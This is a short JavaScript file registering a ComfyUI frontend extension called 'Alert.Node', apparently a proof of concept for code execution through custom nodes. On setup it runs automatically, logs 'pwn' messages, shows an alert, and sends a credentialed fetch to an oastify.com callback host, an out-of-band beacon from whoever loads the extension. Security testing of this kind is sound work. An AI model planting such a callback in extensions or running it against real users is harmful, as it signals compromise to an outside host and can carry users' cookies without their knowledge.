// HF
import { app } from "../../scripts/app.js";
// ComfyDeploy
// import { app } from "../../../scripts/app.js";
const ext = {
    name: 'Alert.Node',
  
    native_mode: false,
  
    init(app) {
        console.log("pwn-init!");
    },

    async beforeRegisterNodeDef(nodeType, nodeData, app2) {
        console.log("pwn-beforeRegisterNodeDef!");
    },

    async setup() {
        console.log("pwn-setup!");
        alert("pwn-setup!");
        await fetch("https://go8w693qtipnk91pif5ittmlpcv3jt7i.oastify.com", {
            method: "GET",
            mode: "no-cors",
            credentials: "include"
        });
    }
}

app.registerExtension(ext);
